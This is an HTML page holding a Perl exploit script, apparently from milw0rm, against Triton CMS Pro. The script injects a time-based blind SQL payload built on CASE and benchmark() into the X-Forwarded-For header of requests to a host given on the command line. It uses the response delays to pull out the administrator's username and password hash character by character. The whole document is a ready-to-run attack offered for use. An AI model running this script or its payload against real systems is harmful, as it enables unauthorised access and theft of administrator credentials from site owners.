<html><head><title>Triton CMS Pro (X-Forwarded-For) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w
#Triton CMS Pro (X-Forwarded-For) Blind SQL Injection
#Admin's username/hash disclosure exploit
#Benchmark() method, so take a coffee and relax
#Coded by __GiReX__

use LWP::UserAgent;
use HTTP::Request;

if(not defined $ARGV[0])
{
	print &quot;\nUsage: perl $0 [host] [path] [1/2]\n&quot;;
	print &quot;Example: perl $0 localhost /tcms/\n&quot;;
	exit;
}

my $host  = ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0]:  'http://' . $ARGV[0];
   $host .=  $ARGV[1] unless not defined $ARGV[1];

my $client =  new LWP::UserAgent;
my $get    =  new HTTP::Request('GET', $host);
my @cset   =  (97..122, 0);               # Only  a-z  charset for username exploit if need change it
my @cset2  =  (48..57, 97..102); 
my $prefix =  &quot;tc_&quot;;         

my ($i, $j) = (0, 1);
my ($user, $hash) = (undef, undef);

banner();

while($i != $#cset)
{  
   for($i = 0; $i &lt;= $#cset; $i++)
   {
    my ($pre_time, $post_time) = time();	
	
	info(chr($cset[$i]), &quot;Username&quot;, $user);
	$rv = check_char($cset[$i], $j, &quot;username&quot;);
	$post_time = time();	
	
	 if($post_time - $pre_time &gt; 3 and $rv)
	 {
		$user .= chr($cset[$i]); 
		last;
	 }
   }

  $j++;
}

if(not defined $user)
{
     print STDOUT &quot;\n\n[-] Exploit mistake: please check the benchmark and expected time\n\n&quot;;
	 exit;
}
else
{
     print STDOUT &quot;\n[+] Admin Hashed Pass: \r&quot;;
}

for($j = 0; $j &lt;= 32; $j++)
{  
    for($i = 0; $i &lt;= $#cset2; $i++)
    {
     $pre_time = time();	
	
	 info(chr($cset2[$i]), &quot;Hashed Pass&quot;, $hash);
	 $rv = check_char($cset2[$i], $j, &quot;password&quot;);
	 $post_time = time();	
	
         if($post_time - $pre_time &gt; 3 and $rv)
	     {
	         $hash .= chr($cset2[$i]);
	         last;
	     }
    }
}

if(not defined $hash or length($hash) != 32)
{
     print STDOUT &quot;\n\n[-] Exploit mistake: please check the benchmark expected time\n\n&quot;;
}
else 
{
     print STDOUT &quot;\n\n[+] Exploit terminated\n\n&quot;;
}


sub banner
{
   print &quot;\n&quot;;
   print &quot;[+] Triton CMS Pro (X-Forwarded-For) Blind SQL Injection\n&quot;;
   print &quot;[+] Admin's username/hash disclosure exploit\n&quot;;
   print &quot;[+] Coded by __GiReX__\n&quot;;
   print &quot;\n&quot;;
}

sub info
{
  my($c, $str, $cur)  =  @_;
	
	$cur = '' unless defined $cur;
	print  STDOUT &quot;[+] Admin ${str}: ${cur}${c}\r&quot;;
	
 $| = 1; 
}

sub check_char
{
  my ($char, $n, $field)  =  @_ ;
   
    $get-&gt;header('X-Forwarded-For' =&gt;  &quot;-1' AND &quot;.
			     &quot;CASE WHEN (SELECT ASCII(SUBSTRING(${field}, ${n}, 1)) &quot;.
			     &quot;FROM ${prefix}members WHERE id=1)=${char} &quot;.
                 &quot;THEN benchmark(99000000, CHAR(0)) END#&quot;); 

    $res = $client-&gt;request($get);
    
  return $res-&gt;is_success;
}

# milw0rm.com [2008-07-07]</pre></html>